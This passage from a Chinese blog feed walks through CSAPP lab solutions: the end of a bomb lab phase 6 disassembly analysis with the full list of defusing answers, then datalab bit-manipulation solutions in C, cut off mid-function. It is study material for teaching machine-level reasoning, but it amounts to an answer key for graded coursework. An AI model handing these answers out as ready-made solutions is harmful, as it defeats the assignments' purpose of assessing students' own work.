%r14,%rax# 循环指针 %rax</span><br><span class="line">0x40115b &lt;+103&gt;:   mov    $0x7,%ecx</span><br><span class="line">0x401160 &lt;+108&gt;:   mov    %ecx,%edx</span><br><span class="line">0x401162 &lt;+110&gt;:   sub    (%rax),%edx</span><br><span class="line">0x401164 &lt;+112&gt;:   mov    %edx,(%rax)# *%rax = 7 - *%rax</span><br><span class="line">0x401166 &lt;+114&gt;:   add    $0x4,%rax</span><br><span class="line">0x40116a &lt;+118&gt;:   cmp    %rsi,%rax</span><br><span class="line">0x40116d &lt;+121&gt;:   jne    0x401160 &lt;phase_6+108&gt;</span><br></pre></td></tr></table></figure><p>%rax 是指向数组 a 的指针，因此上述代码完成 a[i] = 7 - a[i]。</p><p>D. 构造 value 指针数组，第 i 个 value 指针指向 0x6032d0 + 16(a[i] - 1)。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">0x40116f &lt;+123&gt;:   mov    $0x0,%esi# %esi 为偏移量 4i</span><br><span class="line">...</span><br><span class="line">0x40118d &lt;+153&gt;:   add    $0x4,%rsi</span><br><span class="line">0x401191 &lt;+157&gt;:   cmp    $0x18,%rsi</span><br></pre></td></tr></table></figure><p>寄存器 %esi 为偏移量。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">0x401176 &lt;+130&gt;:   mov    0x8(%rdx),%rdx</span><br><span class="line">0x40117a &lt;+134&gt;:   add    $0x1,%eax</span><br><span class="line">0x40117d &lt;+137&gt;:   cmp    %ecx,%eax</span><br><span class="line">0x40117f &lt;+139&gt;:   jne    0x401176 &lt;phase_6+130&gt;</span><br><span class="line">0x401181 &lt;+141&gt;:   jmp    0x401188 &lt;phase_6+148&gt;</span><br><span class="line">0x401183 &lt;+143&gt;:   mov    $0x6032d0,%edx</span><br></pre></td></tr></table></figure><p>上述代码根据 %ecx = a[i] 值，使用 %rdx = *(%rdx + 8) 构造 value 指针，%rdx 初始地址为 0x6032d0。</p><p>利用 <code>print *(int *) 0x6032d0</code> 查询一系列地址的值，可得下表：</p><p><table style="border-collapse:collapse;border-spacing:0;border-color:#ccc" class="tg"><tr><th style="font-family:Arial, sans-serif;font-size:14px;font-weight:normal;padding:10px 5px;border-style:solid;border-width:0px;overflow:hidden;word-break:normal;border-top-width:1px;border-bottom-width:1px;border-color:inherit;color:#ffffff;background-color:#fd6864;text-align:center;vertical-align:top">addr</th><th style="font-family:Arial, sans-serif;font-size:14px;font-weight:normal;padding:10px 5px;border-style:solid;border-width:0px;overflow:hidden;word-break:normal;border-top-width:1px;border-bottom-width:1px;border-color:inherit;color:#ffffff;background-color:#fd6864;text-align:center;vertical-align:top">value</th></tr><tr><td style="font-family:Arial, sans-serif;font-size:14px;padding:10px 5px;border-style:solid;border-width:0px;overflow:hidden;word-break:normal;border-top-width:1px;border-bottom-width:1px;border-color:inherit;color:#333;background-color:#f9f9f9;text-align:center;vertical-align:top">0x6032d0</td><td style="font-family:Arial, sans-serif;font-size:14px;padding:10px 5px;border-style:solid;border-width:0px;overflow:hidden;word-break:normal;border-top-width:1px;border-bottom-width:1px;border-color:inherit;color:#333;background-color:#f9f9f9;text-align:center;vertical-align:top">332</td></tr><tr><td style="font-family:Arial, sans-serif;font-size:14px;padding:10px 5px;border-style:solid;border-width:0px;overflow:hidden;word-break:normal;border-top-width:1px;border-bottom-width:1px;border-color:inherit;color:#333;background-color:#fff;text-align:center;vertical-align:top">0x6032d8</td><td style="font-family:Arial, sans-serif;font-size:14px;padding:10px 5px;border-style:solid;border-width:0px;overflow:hidden;word-break:normal;border-top-width:1px;border-bottom-width:1px;border-color:inherit;color:#333;background-color:#fff;text-align:center;vertical-align:top">0x6032e0</td></tr><tr><td style="font-family:Arial, sans-serif;font-size:14px;padding:10px 5px;border-style:solid;border-width:0px;overflow:hidden;word-break:normal;border-top-width:1px;border-bottom-width:1px;border-color:inherit;color:#333;background-color:#f9f9f9;text-align:center;vertical-align:top">‬0x6032e0</td><td style="font-family:Arial, sans-serif;font-size:14px;padding:10px 5px;border-style:solid;border-width:0px;overflow:hidden;word-break:normal;border-top-width:1px;border-bottom-width:1px;border-color:inherit;color:#333;background-color:#f9f9f9;text-align:center;vertical-align:top">‬168</td></tr><tr><td style="font-family:Arial, sans-serif;font-size:14px;padding:10px 5px;border-style:solid;border-width:0px;overflow:hidden;word-break:normal;border-top-width:1px;border-bottom-width:1px;border-color:inherit;color:#333;background-color:#fff;text-align:center;vertical-align:top">‬0x6032e8</td><td style="font-family:Arial, sans-serif;font-size:14px;padding:10px 5px;border-style:solid;border-width:0px;overflow:hidden;word-break:normal;border-top-width:1px;border-bottom-width:1px;border-color:inherit;color:#333;background-color:#fff;text-align:center;vertical-align:top">0x6032f0‬</td></tr><tr><td style="font-family:Arial, sans-serif;font-size:14px;padding:10px 5px;border-style:solid;border-width:0px;overflow:hidden;word-break:normal;border-top-width:1px;border-bottom-width:1px;border-color:inherit;color:#333;background-color:#f9f9f9;text-align:center;vertical-align:top">0x6032f0‬</td><td style="font-family:Arial, sans-serif;font-size:14px;padding:10px 5px;border-style:solid;border-width:0px;overflow:hidden;word-break:normal;border-top-width:1px;border-bottom-width:1px;border-color:inherit;color:#333;background-color:#f9f9f9;text-align:center;vertical-align:top">924</td></tr><tr><td style="font-family:Arial, sans-serif;font-size:14px;padding:10px 5px;border-style:solid;border-width:0px;overflow:hidden;word-break:normal;border-top-width:1px;border-bottom-width:1px;border-color:inherit;color:#333;background-color:#fff;text-align:center;vertical-align:top">0x6032f8</td><td style="font-family:Arial, sans-serif;font-size:14px;padding:10px 5px;border-style:solid;border-width:0px;overflow:hidden;word-break:normal;border-top-width:1px;border-bottom-width:1px;border-color:inherit;color:#333;background-color:#fff;text-align:center;vertical-align:top">0x603300</td></tr><tr><td style="font-family:Arial, sans-serif;font-size:14px;padding:10px 5px;border-style:solid;border-width:0px;overflow:hidden;word-break:normal;border-top-width:1px;border-bottom-width:1px;border-color:inherit;color:#333;background-color:#f9f9f9;text-align:center;vertical-align:top">0x603300</td><td style="font-family:Arial, sans-serif;font-size:14px;padding:10px 5px;border-style:solid;border-width:0px;overflow:hidden;word-break:normal;border-top-width:1px;border-bottom-width:1px;border-color:inherit;color:#333;background-color:#f9f9f9;text-align:center;vertical-align:top">691</td></tr><tr><td style="font-family:Arial, sans-serif;font-size:14px;padding:10px 5px;border-style:solid;border-width:0px;overflow:hidden;word-break:normal;border-top-width:1px;border-bottom-width:1px;border-color:inherit;color:#333;background-color:#fff;text-align:center;vertical-align:top">0x603308</td><td style="font-family:Arial, sans-serif;font-size:14px;padding:10px 5px;border-style:solid;border-width:0px;overflow:hidden;word-break:normal;border-top-width:1px;border-bottom-width:1px;border-color:inherit;color:#333;background-color:#fff;text-align:center;vertical-align:top">0x603310</td></tr><tr><td style="font-family:Arial, sans-serif;font-size:14px;padding:10px 5px;border-style:solid;border-width:0px;overflow:hidden;word-break:normal;border-top-width:1px;border-bottom-width:1px;border-color:inherit;color:#333;background-color:#f9f9f9;text-align:center;vertical-align:top">0x603310</td><td style="font-family:Arial, sans-serif;font-size:14px;padding:10px 5px;border-style:solid;border-width:0px;overflow:hidden;word-break:normal;border-top-width:1px;border-bottom-width:1px;border-color:inherit;color:#333;background-color:#f9f9f9;text-align:center;vertical-align:top">477</td></tr><tr><td style="font-family:Arial, sans-serif;font-size:14px;padding:10px 5px;border-style:solid;border-width:0px;overflow:hidden;word-break:normal;border-top-width:1px;border-bottom-width:1px;border-color:inherit;color:#333;background-color:#fff;text-align:center;vertical-align:top">0x603318</td><td style="font-family:Arial, sans-serif;font-size:14px;padding:10px 5px;border-style:solid;border-width:0px;overflow:hidden;word-break:normal;border-top-width:1px;border-bottom-width:1px;border-color:inherit;color:#333;background-color:#fff;text-align:center;vertical-align:top">0x603320</td></tr><tr><td style="font-family:Arial, sans-serif;font-size:14px;padding:10px 5px;border-style:solid;border-width:0px;overflow:hidden;word-break:normal;border-top-width:1px;border-bottom-width:1px;border-color:inherit;color:#333;background-color:#f9f9f9;text-align:center;vertical-align:top">0x603320</td><td style="font-family:Arial, sans-serif;font-size:14px;padding:10px 5px;border-style:solid;border-width:0px;overflow:hidden;word-break:normal;border-top-width:1px;border-bottom-width:1px;border-color:inherit;color:#333;background-color:#f9f9f9;text-align:center;vertical-align:top">443</td></tr></table><br>根据代码以及上述表格可得，%rdx = 0x6032d0 + 16 * (a[i] - 1)。</p>   <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">0x401188 &lt;+148&gt;:   mov    %rdx,0x20(%rsp,%rsi,2)</span><br></pre></td></tr></table></figure><p>%rsi 为第 i 个元素的偏移量，值为 4i。</p><p>value 指针数组的起始地址为 %rsp + 32，第 i 个整数的 value 指针地址为 %rsp + 32 + 8i，存储值 %rdx = 0x6032d0 + 16 * (a[i] - 1)。</p><p>E. 构造六个元素的链表。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">0x4011b0 &lt;+188&gt;:   lea    0x28(%rsp),%rax</span><br><span class="line">...</span><br><span class="line">0x4011c4 &lt;+208&gt;:   add    $0x8,%rax</span><br><span class="line">0x4011c8 &lt;+212&gt;:   cmp    %rsi,%rax</span><br></pre></td></tr></table></figure></p><p>寄存器 %rax 是指向 value 指针数组的指针，从第 2 个元素开始。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">0x4011ab &lt;+183&gt;:   mov    0x20(%rsp),%rbx</span><br><span class="line">0x4011ba &lt;+198&gt;:   mov    %rbx,%rc</span><br><span class="line">0x4011bd &lt;+201&gt;:   mov    (%rax),%rdx</span><br><span class="line">0x4011c0 &lt;+204&gt;:   mov    %rdx,0x8(%rcx)</span><br><span class="line">...</span><br><span class="line">0x4011cd &lt;+217&gt;:   mov    %rdx,%rcx</span><br><span class="line">0x4011d0 &lt;+220&gt;:   jmp    0x4011bd &lt;phase_6+201&gt;</span><br></pre></td></tr></table></figure><p>第 i 个元素的 next 指针地址为 <em>(%rcx + 8)，而 %rcx = value[i]，因此 next 的地址等于 </em>(value[i] + 8) = 0x6032d0 + 16 <em> (a[i] - 1) + 8，该地址存储 </em>(%rax) 的值 = value[i + 1] =  0x6032d0 + 16 * (a[i + 1] - 1)。</p><p>即该链表顺序链接，第 i 个元素的下一个元素为第 i + 1 个元素。</p><p>F. 遍历构造链表并比较相邻元素的大小。</p>   <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">0x4011da &lt;+230&gt;:   mov    $0x5,%ebp</span><br><span class="line">...</span><br><span class="line">0x4011f2 &lt;+254&gt;:   sub    $0x1,%ebp</span><br><span class="line">0x4011f5 &lt;+257&gt;:   jne    0x4011df &lt;phase_6+235&gt;</span><br></pre></td></tr></table></figure><p>%ebp 存储循环下标。</p>   <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">0x4011df &lt;+235&gt;:   mov    0x8(%rbx),%rax</span><br></pre></td></tr></table></figure><p>%rbx = value[i]，因此 %rax = *(value[i] + 8) = next + i。</p>   <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">0x4011e3 &lt;+239&gt;:   mov    (%rax),%eax</span><br></pre></td></tr></table></figure><p>从 *(&amp;next[i]) = value[i + 1] 的地址取值并存于 %eax，即 %eax = value[i + 1]。</p>   <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">0x4011e5 &lt;+241&gt;:   cmp    %eax,(%rbx)</span><br><span class="line">0x4011e7 &lt;+243&gt;:   jge    0x4011ee &lt;phase_6+250&gt;</span><br><span class="line">0x4011e9 &lt;+245&gt;:   callq  0x40143a &lt;explode_bomb&gt;</span><br></pre></td></tr></table></figure><p>cmp 指令比较 value[i + 1] 和 value[i]。</p><p>当 value[i] &lt; value[i + 1] 不发生跳转，从而顺序执行 explode_bomb。所以，链表的元素需要满足单调递减的性质。</p><p>查询第 4 步中的表可得，链表序列为 924 691 477 443 332 168，对应的 a[i] 序列为 3 4 5 6 1 2。注意第 3 步中用 7 - a[i] 更新了 a[i] 数组，因此原始的 a[i] 序列为 4 3 2 1 6 5。</p><p>“4 3 2 1 6 5” 为 bomb 的第 6 组运行参数。</p><h3 id="答案"><a href="#答案" class="headerlink" title="答案"></a>答案</h3><p>Border relations with Canada have never been better.<br>1 2 4 8 16 32<br>7 327<br>7 0<br>ionefg<br>4 3 2 1 6 5</p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h2 id=&quot;安装-GDB&quot;&gt;&lt;a href=&quot;#安装-GDB&quot; class=&quot;headerlink&quot; title=&quot;安装 GDB&quot;&gt;&lt;/a&gt;安装 GDB&lt;/h2&gt;&lt;h3 id=&quot;问题一&quot;&gt;&lt;a href=&quot;#问题一&quot; class=&quot;headerlink&quot; title=&quot;问题一
      
    
    </summary>
    
    
  </entry>
  
  <entry>
    <title>CSAPP - datalab</title>
    <link href="http://mcginn7.github.io/2020/02/14/CSAPP-datalab/"/>
    <id>http://mcginn7.github.io/2020/02/14/CSAPP-datalab/</id>
    <published>2020-02-14T14:55:06.000Z</published>
    <updated>2020-02-15T15:07:06.668Z</updated>
    
    <content type="html"><![CDATA[<h2 id="自动测试"><a href="#自动测试" class="headerlink" title="自动测试"></a>自动测试</h2><ol><li><p>使用 dlc 检测代码是否符合题目要求</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">unix&gt; ./dlc bits.c</span><br></pre></td></tr></table></figure></li><li><p>编译并调用自动测试程序</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">unix&gt; make</span><br><span class="line">unix&gt; ./btest</span><br></pre></td></tr></table></figure></li></ol><h2 id="题目"><a href="#题目" class="headerlink" title="题目"></a>题目</h2><h3 id="bitXor-x-y"><a href="#bitXor-x-y" class="headerlink" title="bitXor(x, y)"></a>bitXor(x, y)</h3><p><strong>要求</strong>：仅使用 ~ 和 &amp; 完成异或运算。</p><p><strong>运算</strong>：~ &amp;</p><p><strong>做法</strong>：画出 &amp; 运算符的真值表，配合 ~ 运算符易得。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">bitXor</span><span class="params">(<span class="keyword">int</span> x, <span class="keyword">int</span> y)</span> </span>&#123;</span><br><span class="line">  <span class="keyword">return</span> ~(x&amp;y)&amp;~(~x&amp;~y);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="tmin"><a href="#tmin" class="headerlink" title="tmin()"></a>tmin()</h3><p><strong>要求</strong>：返回二进制补码表示的<strong>最小整数</strong>。</p><p><strong>运算</strong>： ! ~ &amp; ^ | + &lt;&lt; &gt;&gt;</p><p><strong>做法</strong>：补码表示的最小整数为 $10\dots 0$，即符号位为 1，其余位为 0。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">tmin</span><span class="params">(<span class="keyword">void</span>)</span> </span>&#123;</span><br><span class="line">  <span class="keyword">return</span> <span class="number">1</span>&lt;&lt;<span class="number">31</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="isTmax-x"><a href="#isTmax-x" class="headerlink" title="isTmax(x)"></a>isTmax(x)</h3><p><strong>要求</strong>：判断 x 是否为补码表示的最大整数。</p><p><strong>运算</strong>：! ~ &amp; ^ | +</p><p><strong>做法</strong>：当 x 为最大整数时，补码表示为 $01\dots 1$，即符号位为 0，其余位为 1，可得 x + 1 = ~x。</p><p>然而当 x = -1 时，前述等式也成立，因此需要排除掉这种情况。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">isTmax</span><span class="params">(<span class="keyword">int</span> x)</span> </span>&#123;</span><br><span class="line">  <span class="keyword">return</span> !((~x^(x+<span class="number">1</span>)) | !(x+<span class="number">1</span>));</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="allOddBits-x"><a href="#allOddBits-x" class="headerlink" title="allOddBits(x)"></a>allOddBits(x)</h3><p><strong>要求</strong>：判断 x 二进制表示下的奇数位是否全为 1。</p><p><strong>运算</strong>：! ~ &amp; ^ | + &lt;&lt; &gt;&gt;</p><p><strong>做法</strong>：规则允许使用最大为 0xFF 的整数，因此可使用 &amp; 运算每 8 位合并 x 的所有位，然后使用 ^ 运算判断奇数位是否全为 1。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">allOddBits</span><span class="params">(<span class="keyword">int</span> x)</span> </span>&#123;</span><br><span class="line">  <span class="keyword">return</span> !(((x&gt;&gt;<span class="number">24</span>) &amp; (x&gt;&gt;<span class="number">16</span>) &amp; (x&gt;&gt;<span class="number">8</span>) &amp; x &amp; <span class="number">0xAA</span>) ^ <span class="number">0xAA</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="negate-x"><a href="#negate-x" class="headerlink" title="negate(x)"></a>negate(x)</h3><p><strong>要求</strong>：计算返回 -x。</p><p><strong>运算</strong>：! ~ &amp; ^ | + &lt;&lt; &gt;&gt;</p><p><strong>做法</strong>：首先将有符号数转换成<strong>无符号数</strong>以便于位运算处理。</p><p>相互转换的规则是：数值可能会改变，但<strong>位模式不变</strong>。因此，补码转换为无符号数为：</p><script type="math/tex; mode=display">T2U_w(x)=\left\{\begin{array}{lr}x+2^w, && x < 0 \\ x, && x\ge 0\end{array}\right.</script><p>假设 $x \neq 0$，有 $x+(-x)=0$，两侧同加上 $2^w$ 并移项得</p><script type="math/tex; mode=display">-x + 2^w = 2^w - x = (2^w-1-x)+1=\sim x +1</script><p>在 $x &gt; 0$ 时，$-x$ 的补码表示与 $-x+2^w$ 的位模式相同，等于 $\sim x + 1$。</p><p>在 $x \le 0$ 时，$-x + 2^w$ 超出 $w$ 位二进制的表示范围，其结果为 $-x$ 的二进制表示。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">negate</span><span class="params">(<span class="keyword">int</span> x)</span> </span>&#123;</span><br><span class="line">  <span class="keyword">return</span> ~x+<span class="number">1</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="isAsciiDigit-x"><a href="#isAsciiDigit-x" class="headerlink" title="isAsciiDigit(x)"></a>isAsciiDigit(x)</h3><p><strong>要求</strong>：判断值 x 是否在范围 [0x30, 0x39] 中。</p><p><strong>运算</strong>： ! ~ &amp; ^ | + &lt;&lt; &gt;&gt;</p><p><strong>做法</strong>：首先前 $w - 4$ 位的值必须为 3，该判断容易实现。</p><p>剩余 4 位划分成 [0, 7] 和 [8, 9] 的两个区间来处理。</p><p>第 4 位为 0 时，剩余 3 位可为任意值，表示区间 [0, 7]。</p><p>第 4 位为 1 时，8 和 9 的二进制表示分别为 1000 和 1001，即高 3 位必须为 100。</p><p>利用<strong>掩码表示</strong>的思想，x 为 110111(0x37) 的子集或是 111001(0x39) 的子集。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">isAsciiDigit</span><span class="params">(<span class="keyword">int</span> x)</span> </span>&#123;</span><br><span class="line">  <span class="keyword">return</span> (!((x&gt;&gt;<span class="number">4</span>)^<span class="number">3</span>)) &amp; (!(x^(x&amp;<span class="number">0x37</span>)) | !(x^(x&amp;<span class="number">0x39</span>)));</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="conditional-x-y-z"><a href="#conditional-x-y-z" class="headerlink" title="conditional(x, y, z)"></a>conditional(x, y, z)</h3><p><strong>要求</strong>：执行三目运算符 x ? y : z：当 x 不为 0 时，返回 y；否则返回 z。</p><p><strong>运算</strong>：! ~ &amp; ^ | + &lt;&lt; &gt;&gt;</p><p><strong>做法</strong>：核心思想是利用 x 得出位模式等于 -1（全为 1）的值，使用 &amp; 运算和 ~ 运算得到 y 或 z 的位模式，最后使用 | 得到结果。</p><p>! 运算将 x 映射到 [0, 1] 区间，使用函数 $f(x)=!x + (-1)$ 取出 y，则 $\sim f(x)$ 取出 z。</p><p>当 $x \neq 0$ 时，$f(x)=-1$，其位模式全为 1，因此 $f(x) \&amp; y = y$。</p><p>当 $x = 0$ 时，$f(x)=0$，其位模式全为 0，因此 $f(x)\&amp;y=0$。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">conditional</span><span class="params">(<span class="keyword">int</span> x, <span class="keyword">int</span> y, <span class="keyword">int</span> z)</span> </span>&#123;</span><br><span class="line">  x = !x + ~<span class="number">0</span>;</span><br><span class="line">  <span class="keyword">return</span> (y &amp; x) | (z &amp; ~x);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="isLessOrEqual-x-y"><a href="#isLessOrEqual-x-y" class="headerlink" title="isLessOrEqual(x, y)"></a>isLessOrEqual(x, y)</h3><p><strong>要求</strong>：判断 x &lt;= y。</p><p><strong>运算</strong>：! ~ &amp; ^ | + &lt;&lt; &gt;&gt;</p><p><strong>做法</strong>：将问题转换成判断 $a + b \le0$，新问题下需要注意<strong>溢出问题</strong>。</p><p>当 $a+b&lt;0$ 时，其符号位为 1，因此执行 $a+b$ 并取出符号位可解决问题。但是，存在 $a+b$ <strong>上溢出</strong>导致其符号位也为 1 的情况。</p><p>进一步地，当 $a$ 和 $b$ 符号位相同时，$a+b&lt;0$ 当且仅当符号位均为 1。符号位不同时，$a+b$ 不存在溢出问题。</p><p>$a+b=0$ 特判 $x=y$ 即可。</p><p>注意取符号位是 &amp;1 操作不可省略，因为机器使用了<strong>算术右移</strong>。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">isLessOrEqual</span><span class="params">(<span class="keyword">int</span> x, <span class="keyword">int</span> y)</span> </span>&#123;</span><br><span class="line">  <span class="keyword">return</span> (!(x^y)) | ((x&amp;~y)&gt;&gt;<span class="number">31</span>&amp;<span class="number">1</span>) | ((!((x^y)&gt;&gt;<span class="number">31</span>))&amp;((x+(~y+<span class="number">1</span>))&gt;&gt;<span class="number">31</span>));</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="logicalNeg-x"><a href="#logicalNeg-x" class="headerlink" title="logicalNeg(x)"></a>logicalNeg(x)</h3><p><strong>要求</strong>：计算 !x：当 x = 0 时返回 1；当 x ≠ 0 时返回 0。</p><p><strong>运算</strong>：~ &amp; ^ | + &lt;&lt; &gt;&gt;</p><p><strong>做法</strong>：当 $x \neq 0$ 时，$x|(-x)$ 的符号位必然为 1。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">logicalNeg</span><span class="params">(<span class="keyword">int</span> x)</span> </span>&#123;</span><br><span class="line">  <span class="keyword">return</span> ~(x|(~x+<span class="number">1</span>))&gt;&gt;<span class="number">31</span>&amp;<span class="number">1</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="howManyBits-x"><a href="#howManyBits-x" class="headerlink" title="howManyBits(x)"></a>howManyBits(x)</h3><p><strong>要求</strong>：使用二进制补码表示 x 的最少位数。</p><p><strong>运算</strong>：! ~ &amp; ^ | + &lt;&lt; &gt;&gt;</p><p><strong>做法</strong>：当 $x \ge 0$ 时，位数取决于 1 的最高位数；当 $x &lt; 0$ 时，位数则取决于 0 的最高位数（根据补码表示的定义，符号位起连续的 1 可合并起来用一个位表示）。</p><p>首先考虑将负数取反，将问题统一成计算 1 的最高位，利用<strong>算术右移</strong>即可完成， 即 $x=x \oplus (x &gt;&gt;31)$。</p><p>然后使用<strong>二分法</strong>计算 1 的最高位：判断高 16 位是否大于 0，若大于 0 说明高 16 位中存在 1，否则 1 在低 16 位中。使用 conditional 函数更新 x（取出高 16 位或低 16 位）。迭代判断 8 位、4 位等等。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">howManyBits</span><span class="params">(<span class="keyword">int</span> x)</span> </span>&#123;</span><br><span class="line">  <span class="keyword">int</span> bit;</span><br><span class="line">  <span class="keyword">int</span> res = <span class="number">1</span>;</span><br><span class="line">  x = x ^ (x &gt;&gt; <span class="number">31</span>);</span><br><span class="line"></span><br><span class="line">  bit = !!(x &gt;&gt; <span class="number">16</span>) &lt;&lt; <span class="number">4</span>;</span><br><span class="line">  res = res + bit;</span><br><span class="line">  x = x &gt;&gt; bit;</span><br><span class="line"></span><br><span class="line">  bit = !!(x &gt;&gt; <span class="number">8</span>) &lt;&lt; <span class="number">3</span>;</span><br><span class="line">  res = res + bit;</span><br><span class="line">  x = x &gt;&gt; bit;</span><br><span class="line"></span><br><span class="line">  bit = !!(x &gt;&gt; <span class="number">4</span>) &lt;&lt; <span class="number">2</span>;</span><br><span class="line">  res = res + bit;</span><br><span class="line">  x = x &gt;&gt; bit;</span><br><span class="line"></span><br><span class="line">  bit = !!(x &gt;&gt; <span class="number">2</span>) &lt;&lt; <span class="number">1</span>;</span><br><span class="line">  res = res + bit;</span><br><span class="line">  x = x &gt;&gt; bit;</span><br><span class="line"></span><br><span class="line">  bit = !!(x &gt;&gt; <span class="number">1</span>);</span><br><span class="line">  res = res + bit;</span><br><span class="line">  x = x &gt;&gt; bit;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">return</span> x + res;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="floatScale2-uf"><a href="#floatScale2-uf" class="headerlink" title="floatScale2(uf)"></a>floatScale2(uf)</h3><p><strong>要求</strong>：计算 2 * uf，若 uf 为特殊值值时，直接返回 uf。</p><p><strong>运算</strong>：Integer/unsigned 相关运算；||，&amp;&amp;，if 和 while 等判断语句。</p><p><strong>做法</strong>：这道题需要对浮点数表示比较了解，单精度（float）表示包括：1 位符号，8 位阶码，23 位尾数。这里使用 e 表示阶码的无符号数，B 表示阶码的偏置值，f 表示尾数值。</p><ol><li><p>当 e 全 0 时，表示非规格化的值，真实值 $V=f\times 2^{1-B}$。</p><p>乘上系数 2 时，阶码是否变动看 2f 是否大于等于 1，即 f 最高位是否为 1。由于阶码在尾数的高位，该情况下位数左移 1 位即可。</p></li><li><p>当 e 不全 0 也不全 1 时，表示规格化的值，真实值 $V=(1+f)\times 2^{e - B}$。</p><p>阶码 + 1 即可。</p></li><li><p>当 e 全 1 时，表示特殊值。</p></li></ol><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">unsigned</span> <span class="title">floatScale2</span><span class="params">(<span class="keyword">unsigned</span> uf)</span> </span>&#123;</span><br><span class="line">  <span class="keyword">unsigned</span> s = uf &gt;&gt; <span class="number">31</span> &amp; <span class="number">1</span>;</span><br><span class="line">  <span class="keyword">unsigned</span> e = uf &gt;&gt; <span class="number">23</span> &amp; <span class="number">0xff</span>;</span><br><span class="line">  <span class="keyword">unsigned</span> f = uf ^ (s &lt;&lt; <span class="number">31</span>) ^ (e &lt;&lt; <span class="number">23</span>);</span><br><span class="line">  <span class="keyword">if</span> 